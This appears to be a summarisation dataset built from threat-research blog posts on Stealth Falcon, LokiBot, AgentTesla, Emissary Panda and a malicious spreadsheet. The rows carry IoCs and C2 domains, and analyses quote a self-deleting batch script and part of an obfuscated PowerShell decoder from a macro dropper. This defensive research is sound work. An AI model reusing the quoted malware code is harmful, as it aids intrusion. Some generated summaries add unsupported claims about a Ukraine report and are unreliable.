included in a malicious email.Now, we have found a previously unreported binary backdoor we have named Win32/StealthFalcon. In this article, we disclose similarities between this binary backdoor and the PowerShell script with backdoor capabilities attributed to the Stealth Falcon group. We consider the similarities to be strong evidence that Win32/StealthFalcon was created by this group.The Win32/StealthFalcon backdoor, which appears to have been created in 2015, allows the attacker to control the compromised computer remotely. We have seen a small number of targets in UAE, Saudi Arabia, Thailand, and the Netherlands, in the latter case, the target was a diplomatic mission of a Middle Eastern country. How the backdoor was distributed and executed on the target systems is beyond the scope of this investigation, our analysis focuses on its capabilities and its C&C communication.C&C communicationIn its communication with the C&C server, Win32/StealthFalcon uses the standard Windows component Background Intelligent Transfer Service (BITS), a rather unusual technique. BITS was designed to transfer large amounts of data without consuming a lot of network bandwidth, which it achieves by sending the data with throttled throughput so as not to affect the bandwidth needs of other applications. It is commonly used by updaters, messengers, and other applications designed to operate in the background. This means that BITS tasks are more likely to be permitted by host-based firewalls.Compared with traditional communication via API functions, the BITS mechanism is exposed through a COM interface and thus harder for a security product to detect. Moreover, this design is reliable and stealthy. The transfer resumes automatically after being interrupted for reasons like a network outage, the user logging out, or a system reboot. Moreover, because BITS adjusts the rate at which files are transferred based on the bandwidth available, the user has no reason for suspicion.Win32/StealthFalcon can switch the communication between two C&C servers whose addresses are stored in a registry key, along with other configuration values, and can be updated by one of the backdoor commands. In case the backdoor fails to reach out to its C&C servers, the backdoor removes itself from the compromised system after a preconfigured number of failed attempts.CapabilitiesWin32/StealthFalcon is a DLL file that, after execution, schedules itself as a task running on each user login. It only supports basic commands but displays a systematic approach to data collection, data exfiltration, employing further malicious tools, and updating its configuration.Command name Functionality K Uninstall itself CFG Update configuration data RC Execute the specified application DL Write downloaded data to file CF Prepare a file for exfiltration CFW Exfiltrate and delete files CFWD Not implemented/no operationTable 1. Backdoor commandsFor example, the backdoor's key capability, downloading and executing files, is achieved via regular checks for libraries named ""win*.dll"" or ""std*.dll"" in the directory the malware is executed from, and loading these libraries.Furthermore, Win32/StealthFalcon collects files and prepares them for exfiltration by storing an encrypted copy with a hardcoded prefix in a temporary folder. It then regularly checks for such files and exfiltrates them automatically. After the files have been successfully exfiltrated, the malware safe-deletes all log files and collected files - before deleting the files, it rewrites them with random data - to prevent forensic analysis and recovery of the deleted data.The configuration values are stored in the HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Shell Extensions registry key. All values are prefixed by the malware's filename (without extension).Value name suffix Content -FontDisposition Randomly generated, 4-byte victim ID -MRUData RC4-encrypted C&C domain -MRUList RC4-encrypted C&C domain -IconPosition Flag determining which of the C&C domains should be used -IconDisposition Number of seconds to sleep after each iteration of contacting the C&C server -PopupPosition Counter of failed attempts to reach the C&C serversTable 2. Configuration data stored in registryPossible trick to evade detectionOf interest is a function that is executed before any malicious payload is started, and which seems redundant. It references 300+ imports, but does not use them at all. Instead, it always returns and continues with the payload afterward, without condition checks that would suggest it is an anti-emulation trick.Figure 2. A function referencing hundreds of unused imports, possibly added to avoid detection of the malwareWe don't know the precise intention of this function, but we suspect it is either some attempt to evade detection, or some leftover from a larger framework used by the malware authors.Links to Stealth FalconBoth Win32/StealthFalcon and the PowerShell-based backdoor described in the Citizen Lab analysis share the same C&C server: the address windowsearchcache[.]com was used as a ""Stage Two C2 Server Domain"" in the backdoor analyzed by the Citizen Lab, and also in one of the versions of Win32/StealthFalcon.Both backdoors display significant similarities in code - although they are written in different languages, the underlying logic is preserved. Both use hardcoded identifiers (most probably campaign ID/target ID). In both cases, all network communication from the compromised host is prefixed with these identifiers and encrypted with RC4 using a hardcoded key.For their C&C server communication, they both use HTTPS but set specific flags for the connection to ignore the server certificate.ConclusionWe discovered and analyzed a backdoor with an uncommon technique for C&C communication - using Windows BITS - and some advanced techniques to hinder detection and analysis, and to ensure persistence and complicate forensic analysis. Similarities in the code and infrastructure with a previously known malware by Stealth Falcon drive us to the conclusion that the Win32/StealthFalcon backdoor is also the work of this threat group.Indicators of Compromise (IoCs)ESET detection nameWin32/StealthFalconSHA-131B54AEBDAF5FBC73A66AC41CCB35943CC9B7F7250973A3FC57D70C7911F7A952356188B9939E56B244EB62B9AC30934098CA4204447440D6FC4E2595C8F83CC4FF57E7C67925DF4D9DAABE5D0CC07E2RC4 keys258A4A9D139823F55D7B9DA1825D101107FBF88634A870DE9800580DAD556BA32519DB0FFEC604D6C9A655CF56B98EDCE10405DE36810BC3DCF125CDE30BA5A23EDB6EA77CD0987668B360365D5F39FDCF6B366D0DEAC9ECE5ADC6FFD20227F68DFFDE77A39F3AF46D0CE0B84A189DB25A2A0FEFD71A0CD0054D8E0D60AB08DENote: Malware derives a second RC4 key by XORing each byte of the hardcoded key with 0x3D.Host-based indicatorsMalware file namesImageIndexer.dllWindowsBackup.dllWindowsSearchCache.dllJavaUserUpdater.dllLog file name patterns%TEMP%\dsc*%TEMP%\sld*%TEMP%\plx*Registry keys/valuesHKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Shell ExtensionsX-MRUListX-MRUDataX-FontDispositionX-IconDispositionX-IconPositionX-PopupPositionX is the malware's filename (without extension).Network indicatorsBITS job namesWindowsImages-WindowsBackup-WindowsSearchCache-ElectricWebC&C serversfootballtimes[.]infovegetableportfolio[.]comwindowsearchcache[.]comelectricalweb[.]orgupnpdiscover[.]orgMITRE ATT&CK techniquesTactic ID Name Description Execution T1059 Command-Line Interface Malware uses cmd.exe to execute some commands. T1106 Execution through API Malware uses CreateProcessW API for execution. T1085 Rundll32 Malware uses rundll32.exe to load the backdoor DLL. T1053 Scheduled Task Malware schedules rundll32.exe to be executed on each login, and subsequently to load the backdoor DLL. Persistence T1053 Scheduled Task Malware establishes persistence by scheduling a task that loads the backdoor on each user login. Defense Evasion T1197 BITS Jobs Malware uses BITS file transfer mechanism for network communication, in an attempt to avoid detection. T1140 Deobfuscate/Decode Files or Information Strings are encrypted with a custom XOR cipher. Configuration data and log files are encrypted with RC4, using a hardcoded key. T1107 File Deletion Malware overwrites files with random data, and deletes them after exfiltration. T1036 Masquerading Malware attempts to disguise itself by using seemingly-legitimate file names. T1112 Modify Registry Malware stores its configuration in a registry key. T1027 Obfuscated Files or Information Strings are encrypted with a custom XOR cipher. Configuration data and log files are encrypted with RC4, using a hardcoded key. Discovery T1063 Security Software Discovery Malware terminates itself if McAfee Agent binary ( cmdagent.exe ) is detected. Collection T1074 Data Staged Malware stores collected data in a temporary folder in files named with a hardcoded prefix. T1005 Data from Local System Malware has a command to collect/steal a file from the compromised system. Command and Control T1008 Fallback Channels Malware is able to communicate with two C&C servers, it also supports switching to a different C&C server using a backdoor command. T1105 Remote File Copy Malware uses BITS Jobs for C&C communication. T1005 Standard Cryptographic Protocol Malware encrypts C&C communication using RC4 with a hardcoded key. Exfiltration T1020 Automated Exfiltration Malware automatically exfiltrates files in a temporary folder in files named with a hardcoded prefix. T1022 Data Encrypted Malware encrypts the collected data using RC4 with a hardcoded key, prior to exfiltration. T1041 Exfiltration Over Command and Control Channel Malware exfiltrates data over the C&C channel.Sign up to receive an email update whenever a new article is published in our Ukraine Crisis - Digital Security Resource Center Submit";"Win32/StealthFalcon is a DLL file that, after execution, schedules itself as a task running on each user login. It only supports basic commands but displays a systematic approach to data collection, data exfiltration, employing further malicious tools, and updating its configuration.Command name Functionality K Uninstall itself CFG Update configuration data RC Execute the specified application DL Write downloaded data to file CFW Exfiltrate and delete files CFWD Not implemented/no operationTable 1. Backdoor commandsFor example, the backdoor's key capability, downloading and executing files, is achieved via regular checks for libraries named ""win*.dll"" or ""std*.dll"" in the directory the malware is executed from, and loading these libraries.Furthermore, Win32/StealthFalcon collects files and prepares them for exfiltration by storing an encrypted copy with a hardcoded prefix in a temporary folder. It then regularly checks for such files and exfiltrates them automatically. After the files have been successfully exfiltrated, the malware safedeletes all log files and collected files before deleting the files, it rewrites them with random data to prevent forensic analysis and recovery of the deleted data.The configuration values are stored in the HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Shell Extensions registry key. The malware is detected as Win32/StealthFalcon. The ITSecurity report provides a comprehensive overview of the security risks posed by malware in Ukraine. The malware analyzed in the report includes T1107 File Deletion Malware, T1036 Masquerading Malware, T1112 Modify Registry Malware, T1027 Obfuscated Files or Information Str";en;{'r': 0.21965317919075145, 'p': 0.9382716049382716, 'f': 0.3559718938812806};{'r': 0.1437403400309119, 'p': 0.8340807174887892, 'f': 0.24522082807885495};{'r': 0.21965317919075145, 'p': 0.9382716049382716, 'f': 0.3559718938812806}
https://www.fortinet.com/blog/threat-research/new-infostealer-attack-uses-lokibot;Newly Discovered Infostealer Attack Uses LokiBot;"The FortiGuard Labs SE team identified a new malicious spam campaign on August 21st,, which we discovered after an analysis of information initially found on VirusTotal. It targeted a large US manufacturing company utilizing the well documented infostealer LokiBot. Interestingly enough, this also has a compilation date of August 21st, which is the same day we discovered the malspam campaign. Campaign Details The campaign consists of a spam email that had been sent to the sales email address of the recipients, possibly from a compromised trusted sender, originating from the IP address of [23.83.133.8].Figure 1. Variant of spam email sent to recipientThe spam email is simple in appearance, and contains simple language that appears to be written by a non-native English speaker that states, ""Please see 'attache'"", which appears to be an ""RFQ"" or a ""request for quotation."" The spam email then encourages the user to open the attachment as the senders' colleague is currently out of office, and at the same time offers the potential victim some assurance that he/she can provide further clarification of the contents within the document if needed. However, unbeknownst to the user, the RFQE67Y54.7z file [SHA256: 176C61B6220854995AF271F3BA82BBD7960AACC20E070A3476D8FBAC5AB0C2D8 - detected as: Malicious_Behavior.SB] is not a request for quotation, and once unzipped, it is the infamous infostealer found on various underground forums, LokiBot. [SHA256: 691c65e4fb1d19f82465df1d34ad51aaeceba14a78167262dc7b2840a6a6aa87 - detected as: W32/Windigo.ABV] Shared Space - Previous attacks and possible spam relay? Digging a little further by investigating the IP address [23.83.133.8], it appears that this IP is registered to LeaseWeb USA, Inc. a webhosting provider in Phoenix, Arizona. During our investigation, we did not find any significant activity behind this IP address, and historical archives in VirusTotal and our data show that attacks originating from this IP address are new, seen most recently within the past two months. This particular IP address appears to have been used twice before in malicious spam attacks that occurred several months earlier, in June, attacking a large German Bakery in a malicious spam attack trying to lure a victim into downloading an electronic invoice. Although the German Bakery attack email was in Chinese, as was the attachment - which was an RTF file which referenced a potentially compromised URL (deepaklab[.]com), that likely contained the malicious payload - the URL has been cleaned up and no longer serves up any content that we can analyze. It can be assumed that this may be another delivery mechanism for LokiBot, as it has been documented in the past utilizing RTF distribution vectors. But again, we are unable to draw any conclusions due to the lack of information available at the time of publication. Analyzing further insight from our own telemetry, we were able to observe a rather large spike in visits, specifically on the date of June 17, which correlates with the time stamp of this suspicious campaign, as well as telemetry from German visitors.Figures 2 and 3: Variant of spam email sent to recipient (translated from Chinese)Figures 2 and 3: Variant of spam email sent to recipient (translated from Chinese)To connect the dots - this is interesting, because the German attack is consistent with our own telemetry - the United States, Germany, and Japan rounded off the top three countries targeted by LokiBot, with the United States at 56%, Germany with 22%, and Japan at >1%, respectively. We also observed a large spike starting on June 17th for the German Baker attack, and again on August 21st for the U.S. semiconductor distributor - which is the same time we came across this newly identified campaign, further confirming our observations.Figure 4. Global Distribution of Palikyu.ml Based LokiBot Attacks for Palikyu.mlBecause of the differences in emails (both in language and attack template), and because we couldn't identify the payload being served in the June attack, we can only assume that this IP address is a newly identified spam relay that may either be used indiscriminately or in targeted attacks with LokiBot or some other unidentified malware. Because of the low volume identified, it appears that this IP address may be under the control of one group, and possibly only being used for very targeted attacks. However, we can only assume this - time will provide a better historical snapshot of campaigns using this IP address. Finally, one loose connection observed from this IP address through historical DNS records was that in the past the Chinese site ccltyo.com, which appears to be some clickspam website, was hosted on this [23.83.133.8] IP address back in June of 2013. Although this domain exhibits some suspicious behavior, as well as utilizing dynamic DNS similar to campaigns we've seen in the past for various threat actors, especially in China, there is not a smoking gun from OSINT or our own telemetry that can correlate this latest campaign to a specific threat actor group. Attack Description The attack is pretty straightforward. The LokiBot sample [SHA256: 691c65e4fb1d19f82465df1d34ad51aaeceba14a78167262dc7b2840a6a6aa87] has a file size of 286 KB and was recently compiled on Aug 21, which is coincidentally the same date as when the malicious spam was sent. The file is curiously named Dora Explorer Games, which is in reference to the children's' TV heroine from the show ""Dora The Explorer"", however, we don't know if this file info was put in there as a distraction or for reasons unknown to us, as it doesn't make sense to have such a file name targeting a military and government-based contractor.Figure 5. False file informationOf course, the file is not a game, but is the infamous LokiBot infostealer, which is one of the most popular infostealers in recent memory due to its ease of use and effectiveness. LokiBot steals a variety of credentials - primarily FTP credentials, stored email passwords, passwords stored in the browser, as well as a whole host of other credentials. LokiBot is distributed in various forms, and has been seen in the past being distributed in zipped files along with malicious macros in Microsoft Word and Excel, or leveraging the exploit CVE-2017-11882 (Office Equation Editor) via malicious RTF files, which is similar to the attack example above that targeted the German bakery (however, minus the use of a known exploit.)Figure 6. List of specific software that Loki targetsAs LokiBot is already well documented and covered in various blogs, including ones from Fortinet, we will only highlight the unique characteristics observed in this specific sample. The file creates a directory %appdata%\[6 random hex chars]It will then:add attribute FILE_ATTRIBUTE_HIDDENadd attribute FILE_ATTRIBUTE_SYSTEMadd attribute FILE_NOT_CONTENT_INDEXEDcopies itself to %appdata%\[6 random hex chars]\[6 different random hex chars]\.exe add attribute FILE_ATTRIBUTE_HIDDENadd attribute FILE_ATTRIBUTE_SYSTEMadd attribute FILE_NOT_CONTENT_INDEXED create mutex: 2B1733F511B2DFE5171B9AA1Once these changes are made, it then deletes itself.Ultimately, it will connect via POST:hxxp://palikyu.ml/alpha/fre.php104.31.95.221 (aug 22, 2019 CloudFare Inc.) Palikyu.ml and Palikyu.tk Another interesting behavior to note is that the domain contacts Palikyu.ml - specifically, hxxp://palikyu.ml/alpha/fre.php (104.31.95.221). The TLD for ML is Mali, and the domain is registered using the POINT ML (via partnership with Freenom) registrar, which offers free domains and free anonymous registrations. To make matters worse, attribution is difficult because the domain (and IP address) are hosted using CloudFare, which anonymizes the originating IP address. Which means we don't even know where the site is hosted, nor can we begin the attribution process to link it to previous campaigns. Unfortunately, the attacker has stuck to effectively hiding their origins using OPSEC practices that have allowed them to remain anonymous. We tried several known techniques to expose any mistakes that would lead us to identifying the possible attacker behind this domain, to no avail. Only a law enforcement court order or insider tip could effectively provide further information. Furthermore, we also observed an additional domain, palikyu.tk, which was also registered with FreeNom. A DIG on the domain revealed that either an IP address has not yet been assigned, or a record for this domain does not exist, suggesting that the attacker is reserving the palikyu.tk variant for another use currently unknown to us. It appears that FreeNom does not reveal the registration dates of domains, so additional identifying information is not available to correlate when these domains were registered. We can only surmise that these two are related as they are the only two domains in existence with the string ""palkiyu"" in it. Another final observation noted was that this particular sample did not use any steganography as past variants were seen doing.Figure 7: Whois information for Palikyu.mlFigure 8. Palikyu.tkFigure 9. FreeNom results showing the existence of Palikyu.tk";"The ITSecurity team has identified a new malicious spam campaign on August 21st, which we discovered after an analysis of information initially found on VirusTotal. It targeted a large US manufacturing company utilizing the well documented infostealer LokiBot. Interestingly enough, this also has a compilation date of August 21st, which is the same day we discovered the malspam campaign. Campaign Details The campaign consists of a spam email that had been sent to the sales email address of the recipients, possibly from a compromised trusted sender, originating from the IP address of [23.83.133.8]. The spam email is simple in appearance, and contains simple language that appears to be written by a nonnative English speaker that states, ""Please see 'attache'"", which appears to be an ""RFQ"" or a ""request for quotation."" The spam email then encourages the user to open the attachment as the senders' colleague is currently out of office, and at the same time offers the potential victim some assurance that he/she can provide further clarification of the contents within the document if needed. However, unbeknownst to the user, the RFQE67Y54.7z file [SHA256: 176C61B6220854995AF271F3BA82BBD7960AACC20E070A3476D8FBAC5AB0C2D8 detected as: Malicious_Behavior.SB] is not a request for quotation, and once unzipped, it is the infamous infostealer found on various underground forums, LokiBot. [SHA256: 691c";en;{'r': 0.2177293934681182, 'p': 0.9790209790209791, 'f': 0.35623409371543363};{'r': 0.1523809523809524, 'p': 0.9552238805970149, 'f': 0.2628336731916904};{'r': 0.2177293934681182, 'p': 0.9790209790209791, 'f': 0.35623409371543363}
https://blog.nviso.eu/2019/09/18/malicious-spreadsheet-dropping-a-dll/;Analyzing a Malicious Spreadsheet Dropping a DLL;IntroductionThis week, we received a suspicious spreadsheet which was used as a malware dropper in a phishing campaign. The spreadsheet writes a DLL file to disk and subsequently executes it. In this blog post, we perform the full analysis of the suspicious spreadsheet.Analyzing the documentThe analysis of this Excel file starts with open-source tool oledump.py:In this report, we can see 22 streams, several of these contain VBA macros (streams 12, 13, 14, 20 and 22). And one stream (4) has an O indicator: stream 4 contains an embedded object.Streams with embedded objects also contain metadata, that can be displayed by selecting the stream (-s 4) and using option -i:The extension of the filename and the MAGIC header identify this embedded file as a PNG file. PNG files are often used by malware authors to append a malicious payload, like a Windows executable (PE file). This is something that can be easily tested using YARA rule contains_pe_file. Option -y is used to scan each stream with the given YARA rule(s), and report matches:There's a match for this rule with the content of stream 4, the embedded PNG file.This provides us with strong evidence that this spreadsheet is malicious: it contains VBA macros and a PNG file with a hidden Windows executable.pecheck.py is an open-source tool to analyze PE files. It has an option (-l -locate) to search and select embedded PE files. Using option -l P on the embedded PNG file provides us with an overview of all embedded PE files:2 PE files were found: a 32-bit DLL and a 64-bit DLL.The first DLL starts at position 0x00002ebb inside the PNG file, and ends at position 0x00016eba. End position 0x00016eba is the end of the PE file without any potential overlay.An overlay is data appended to the end of a PE file, that is not referenced in the headers/data structures of the PE file. Since PE files have no end-of-file marker, it's not trivial to identify the presence of a potential overlay when carving PE files.Since end position 0x00016eba is right before start position 0x00016ebb of the second DLL, it's probable that the first DLL has no overlay (unless the second DLL is the overlay of the first DLL).The second DLL starts at position 0x00016ebb inside the PNG file, and ends at position 0x000270ba. End position 0x000270ba is the end of the PE file without any potential overlay, but also the end of the PNG file (EOF indicator). Hence the second DLL has no overlay.Analyzing the first PE file in detail with pecheck.py can be done using option -l 1: this carves the first PE file out of the PNG file from its start position to the end of the PNG file.This DLL, without overlay can be found on VirusTotal: 3bd4fcbee95711392260549669df7236Analysis of the second DLL is done the same way:This DLL too can be found on VirusTotal: 6eede113112f85b0ae99a2210e07cdd0To execute the code inside a DLL, a DLL has to be loaded inside an existing process. There are various ways to do this: using a file and Win32 API function LoadLibrary, fileless reflective loading, ...When we look at the VBA code, it becomes clear that what this malicious spreadsheet does:The VBA code extracts the proper DLL to disk (exchange1.dll or exchange2.dll), loads it inside the Excel process with API call LoadLibrary and then calls exported function Amway (more on this in a later blog post). This is done using code that was made public about a year ago.Remark that there are 2 DLLs, one 32-bit and another 64-bit, because of the various environments where the malware has to operate. Microsoft Office comes in 2 flavors: 32-bit Office and 64-bit Office. A 32-bit process uses 32-bit DLLs, and a 64-bit process uses 64-bit DLLs. Depending on the bitness of the Office process, the corresponding DLL will be written to disk and then loaded into the Excel process.For an attacker, the use of a DLL can offer the advantage of bypassing application whitelisting, depending on the technology used. Not all application whitelisting solutions take DLLs into account. For example, in its default configuration, AppLocker will not prevent loading of DLLs. Whitelisting of DLLs has to be configured explicitly.ConclusionUnlike most malicious documents that drop a malicious EXE and create a new process, this spreadsheet drops a malicious DLL and does not create a new process. If you protect your machines with an application whitelisting solution, make sure it handles DLLs too.About the authorsDidier Stevens is a malware expert working for NVISO. Didier is a SANS Internet Storm Center senior handler and Microsoft MVP, and has developed numerous popular tools to assist with malware analysis. You can find Didier on Twitter and LinkedIn.Didier will be teaching a class on malicious documents for red teams at BruCON in October.Share this: TwitterRedditWhatsAppEmail;NOPE;en;{'r': 0.0, 'p': 0.0, 'f': 0.0};{'r': 0.0, 'p': 0.0, 'f': 0.0};{'r': 0.0, 'p': 0.0, 'f': 0.0}
https://meltx0r.github.io/tech/2019/09/19/emissary-panda-apt.html;09/19/2019 - Emissary Panda APT: Recent infrastructure and RAT analysis;"SummaryEmissary Panda, a group that goes by many names (APT27, IronTiger, BronzeUnion, TG-3390, and LuckyMouse), is a Chinese APT that is suspected of being active for nearly a decade. This group has been known to target aerospace, government, defense, technology, energy, and manufacturing sectors. Not much activity has been publicly recorded on this group as of late, but research indicates they are not dormant.AnalysisWhile performing research, I identified a suspect binary titled ""odbcad32.exe"". What immediately piqued my interest was that this binary, while having the appearance of the legitimate ""Open Database Connectivity Data Source Administrator utility"" by Microsoft, was not signed with a Microsoft certificate. Instead, this binary was signed with a certificate belonging to ""Hangzhou Bianfeng Networking Technology Co., Ltd."". Open source research on this company name indicates that it is a Chinese software company, and a subsidiary of the media organization ""Zhejiang Daily Digital"", which is headquartered in Hangzhou, China.Shown above: Certificate used to sign malicious binary used by Emissary Panda APTAt this point, I decided to dig deeper into this binary and see why it was attempting to disguise itself as a legitimate Microsoft utility. Upon execution, the binary would elevate privileges and drop two files - odbccx32.dll in the C:\Windows\system32\ folder, and a randomly named batch file in the user's local temp folder.@echo off :err del ""c:\Users\[Username]\Desktop\odbcad32.exe"" >nul if exist ""c:\Users\[Username]\Desktop\odbcad32.exe"" goto err >nul @echo on del ""c:\Users\[Username]\AppData\Local\Temp\[random].bat""Shown above: Content within the batch fileNet.exe was then launched with the parameters ""stop ""Remote Registry Configuration"""". Next, rundll32.exe loads the aforementioned ""odbccx32.dll"", and then another net.exe is launched with the parameters ""start ""Remote Registry Configuration"""". Once the malicious DLL is loaded via rundll32.exe, it then establishes persistence via a new service. Cmd.exe then executes the dropped batch file, which deletes the originally executed file, as well as the batch file itself.Following this, Svchost.exe is executed and loads the malicious odbccx32.dll. It then drops the file ""autochk.sys"" in the C:\Windows\system32\drivers\ folder, and reads the hosts file located in the C:\Windows\system32\drivers\etc\hosts folder (this file contains the mappings of IP addresses to host names). Command & Control is then initiated to ""yofeopxuuehixwmj.redhatupdater.com"" over ports 53, 80, and 443. While this domain currently resolves to 80.85.153.176, no response was received from probing attempts, and no secondary payload was observed.Shown above: Process graphThe TTP's (Tactics, Techniques, and Procedures) observed in this sample are consistent with those seen in past attacks conducted by the Emissary Panda APT group, specifically in relation to the ZxShell Remote Access Trojan (RAT) which they have been observed using.I then pivoted into VirusTotal's relational graphing utility to see if I could gather additional information on this campaign's infrastructure. This revealed four structurally similar binaries that I suspect of also being ZxShell RAT installers - one of which beaconed to the same Command & Control server as the original sample (yofeopxuuehixwmj.redhatupdater.com). The second and third binaries beaconed to language.wikaba.com and solution.instanthq.com - both of which have been documented as being Command & Control servers for past Emissary Panda APT campaigns. I was unable to confirm the fourth binary being a ZxShell RAT installer, which beacons to awvsf7esh.dellrescue.com, however VirusTotal deems that it is structurally similar to previously confirmed installers. Please note that the domain ""dellrescue.com"" has been documented by Cylance as having been used in a campaign conducted by PassCV APT group in 2016, although the subdomain utilized was different (sc.dellrescue.com).Shown above: VirusTotal GraphAt this time, I was unable to obtain evidence of target attribution - however in the past Emissary Panda APT has been observed targeting Asia, Middle East, US, and UK based organizations and infrastructure. What struck me as most interesting from my analysis of this sample was how the Emissary Panda APT group was able to obtain a valid certificate to sign their Remote Access Trojan binary, which sparks the question - was this group able to compromise the Chinese based software company and steal their certificate(s), or are there possible insider threats lurking within? Regardless, it is an interesting sample and displays that Emissary Panda is still active.IndicatorsIndicator Type Description 70cff7c176c7df265a808aa52daf6f34 MD5 odbcad32.exe - ZxShell RAT Installer 37fc73c754ef2706659a18837a90ddaa MD5 odbcad32.exe - ZxShell RAT Installer A9C2FF438C73E865624EEB0763235A14 MD5 odbccx32.dll - ZxShell RAT service DLL yofeopxuuehixwmj.redhatupdater.com Domain ZxShell RAT Command & Control server 1b2d75f9c7717f377100924cdbdb10b1 MD5 odbcad32.exe - Unconfirmed ZxShell RAT Installer awvsf7esh.dellrescue.com Domain Unconfirmed ZxShell RAT Command & Control server 850df4a726a71f50d3cc7192c8cf7e6a MD5 odbcad32.exe - older ZxShell RAT Installer from 2018 b7f958f93e2f297e717cffc2fe43f2e9 MD5 odbcad32.exe - ZxShell RAT Installer previously documented by Dell SecureWorks CTU language.wikaba.com Domain ZxShell RAT Command & Control server previously documented by Dell SecureWorks CTU solution.instanthq.com Domain ZxShell RAT Command & Control server previously documented by Dell SecureWorks CTUReferences/Further Reading";Emissary Panda is a Chinese APT that has been active for nearly a decade. This group has been known to target aerospace, government, defense, technology, energy, and manufacturing sectors. Not much activity has been publicly recorded on this group as of late, but research indicates they are not dormant. The Emissary Panda APT group has been observed targeting Asia, Middle East, US, and UK based organizations and infrastructure. What struck me as most interesting from my analysis of this sample was how the Emissary Panda APT group was able to obtain a valid certificate to sign their Remote Access Trojan binary, which sparks the question was this group able to compromise the Chinese based software company and steal their certificate(s), or are there possible insider threats lurking within? Regardless, it is an interesting sample and displays that Emissary Panda is still active.;en;{'r': 0.24060150375939848, 'p': 1.0, 'f': 0.3878787847522498};{'r': 0.17971014492753623, 'p': 0.9612403100775194, 'f': 0.30280830015430243};{'r': 0.24060150375939848, 'p': 1.0, 'f': 0.3878787847522498}
https://blog.talosintelligence.com/threat-source-newsletter-sept-19-2019/;Threat Source newsletter (Sept. 19, 2019);"Newsletter compiled by Jon Munshaw.Welcome to this week's Threat Source newsletter -- the perfect place to get caught up on all things Talos from the past week.We're all still trying to shake off the summer. Gone are the early Fridays, beach vacations and days by the pool. Turns out, attackers may be brushing the same things off. The ever-present Emotet went quiet over the summer, but it's back now with a slew of new campaigns. While this may sound concerning, the same protections and coverage you've always used will keep you safe.And, speaking of things that won't stay down, cryptocurrency miners still aren't going anywhere. We've discovered a new threat actor we're calling ""Panda"" that is rapidly spreading miners, even as digital currencies decline in value.This was also a busy week for vulnerability discovery. We've got three new vulnerability spotlights out: the Aspose PDF API, Atlassian's Jira software and the AMD ATI Radeon line of graphics cards.We also have our weekly Threat Roundup, which you can find on the blog every Friday afternoon. There, we go over the most prominent threats we've seen (and blocked) over the past week.Cyber Security Week in ReviewNotable recent security issues Title: Remote code execution vulnerability in some AMD Radeon cardsDescription: A line of AMD Radeon cards contains a remote code execution vulnerability in their ATIDXX64.DLL driver. AMD produces the Radeon line of hardware, which includes graphics cards and graphics processing units. This specific vulnerability exists on the Radeon RX 550 and the 550 Series while running VMWare Workstation 15. An attacker could exploit this vulnerability by supplying a malformed pixel shared inside the VMware guest operating system to the driver. This could corrupt memory in a way that would allow the attacker to gain the ability to remotely execute code on the victim machine.Snort SIDs: 49978, 49979 (Written by Tim Muniz)Title: Atlassian Jira service contains multiple vulnerabilities, including remote JavaScript executionDescription: Atlassian's Jira software contains multiple vulnerabilities that could allow an attacker to carry out a variety of actions, including the disclosure of sensitive information and the remote execution of JavaScript code. Jira is a piece of software that allows users to create, manage and organize tasks and manage projects. These bugs could create a variety of scenarios, including the ability to execute code inside of Jira and the disclosure of information inside of tasks created in Jira, including attached documents.Snort SIDs: 50110, 50111 (Written by Amit Raut), 50114 (Written by Josh Williams)Most prevalent malware files this weekSHA 256: 7acf71afa895df5358b0ede2d71128634bfbbc0e2d9deccff5c5eaa25e6f5510MD5: 4a50780ddb3db16ebab57b0ca42da0fbTypical Filename: xme64-2141.exeClaimed Product: N/ADetection Name: W32.7ACF71AFA8-95.SBX.TGSHA 256: 26da22347f1d91f6ca56b7c47644a776b72251d3de11c90d9fd77556d5236f5eMD5: f6f6039fc64ad97895142dc99554e971Typical Filename: CSlast.gifClaimed Product: N/ADetection Name: W32.26DA22347F-100.SBX.TGSHA 256: 46b241e3d33811f7364294ea99170b35462b4b5b85f71ac69d75daa487f7cf08MD5: db69eaaea4d49703f161c81e6fdd036fTypical Filename: xme32-2141-gcc.exeClaimed Product: N/ADetection Name: W32.46B241E3D3-95.SBX.TGSHA 256: 093cc39350b9dd2630a1b48372abc827251a3d37bd88c35cea2e784359b457d7MD5: 3c7be1dbe9eecfc73f4476bf18d1df3fTypical Filename: sayext.gifClaimed Product: N/ADetection Name: W32.093CC39350-100.SBX.TGSHA 256: 15716598f456637a3be3d6c5ac91266142266a9910f6f3f85cfd193ec1d6ed8bMD5: 799b30f47060ca05d80ece53866e01ccTypical Filename: mf2016341595.exeClaimed Product: N/ADetection Name: W32.Generic:Gen.22fz.1201";NOPE;en;{'r': 0.0, 'p': 0.0, 'f': 0.0};{'r': 0.0, 'p': 0.0, 'f': 0.0};{'r': 0.0, 'p': 0.0, 'f': 0.0}
https://yoroi.company/research/commodity-malware-reborn-the-agenttesla-total-oil-themed-campaign/;Commodity Malware Reborn: The AgentTesla “Total Oil” themed Campaign;"IntroductionNowadays the Malware-As-A-Service is one of the criminal favorite ways to breach security perimeter. Agent Tesla is one of these ""commodity malware"". It is a fully customizable password info-stealer and many cyber criminals are choosing it as their preferred recognition tool.During our monitoring operations we discovered an infection-chain designed to deliver this kind of malware to some Italian companies. The attack has been carried out impersonating personnel from the Liberian division of a global Oil Corporate. The malicious email message were spoofed, but the reference to the employee was realistic and suggests he may have conducted some preliminary OSINT.Technical AnalysisHash 72087f6eda897bd3deb31fa85cfbeda8eae4bad0d51a123f3e99ae8fb604a8c0 Threat Macro Dropper Brief Description Agent Tesla Doc Macro Dropper Ssdeep 768:nI5p+fXDk6n/lj9uJUWbnyAik8Y61g187083VCP9V9eakw6L8:8p+fzP/bgfix28ly9VZH6L8Table 1. Static information about the doc macroThe document uses a common phishing schema, it invites the user to enable the macro execution due to compatibility reasons with older Microsoft Office versions. The document contains an obfuscated VBA macro.Figure 1: Screen of the fake documentFigure 2: Piece of the malicious macroDespite the variable names and the altered code flow, the macro simply decodes its hidden payload and then executes it. In fact, after a series of text replacement the document spawns another Powershell script.powershell -WindowStyle Hidden function b72f3 { param($l74b5) $l557ad = 'bc9b4',$l63acc = '', for ($i = 0, $i -lt $l74b5.length, $i+=2) { $f3ed5fa = [convert]::ToByte($l74b5.Substring($i, 2), 16), $l63acc += [char]($f3ed5fa -bxor $l557ad[($i / 2) % $l557ad.length]), } return $l63acc,} $k61b35e = 